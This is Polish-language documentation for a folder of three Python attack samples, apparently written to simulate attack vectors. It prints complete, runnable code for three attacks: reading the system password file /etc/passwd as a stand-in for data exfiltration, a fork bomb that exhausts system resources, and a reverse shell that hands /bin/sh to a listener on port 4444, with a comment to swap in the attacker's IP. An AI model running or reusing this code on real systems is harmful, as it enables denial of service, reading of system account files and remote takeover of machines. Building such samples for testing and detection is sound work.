# Dokumentacja Złośliwego Kodu

## Wprowadzenie

Ta dokumentacja opisuje trzy przykłady złośliwego kodu dostarczone w tym folderze. Każdy skrypt jest napisany w Pythonie i ma na celu symulowanie określonego wektora ataku.

## `malicious_code_1.py`: Eksfiltracja Danych

Ten skrypt próbuje odczytać zawartość pliku `/etc/passwd`, który zawiera listę użytkowników w systemach uniksowych. W rzeczywistym ataku dane te zostałyby wysłane na zdalny serwer. W tym przykładzie dane są po prostu drukowane na standardowe wyjście.

```python
import os

def exfiltrate_data(file_to_read):
    try:
        with open(file_to_read, 'r') as f:
            data = f.read()
        # In a real attack, this data would be sent to a remote server.
        # For this example, we'll just print it to stdout.
        print(data)
    except Exception as e:
        print(f"Error reading file: {e}")

if __name__ == "__main__":
    # Attempt to read a sensitive file.
    exfiltrate_data('/etc/passwd')
```

## `malicious_code_2.py`: Bomba Widelcowa (Fork Bomb)

Ten skrypt tworzy klasyczną bombę widelcową. W nieskończonej pętli tworzy nowe procesy, co prowadzi do wyczerpania zasobów systemowych i potencjalnie do awarii systemu.

```python
import os

def fork_bomb():
    while True:
        os.fork()

if __name__ == "__main__":
    fork_bomb()
```

## `malicious_code_3.py`: Odwrotna Powłoka (Reverse Shell)

Ten skrypt próbuje utworzyć odwrotną powłokę do określonego adresu IP i portu. Jeśli się powiedzie, atakujący uzyska zdalny dostęp do powłoki na maszynie, na której uruchomiono skrypt.

```python
import os
import socket
import subprocess

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Error creating reverse shell: {e}")

if __name__ == "__main__":
    # Replace with the attacker's IP and port.
    reverse_shell('127.0.0.1', 4444)
```
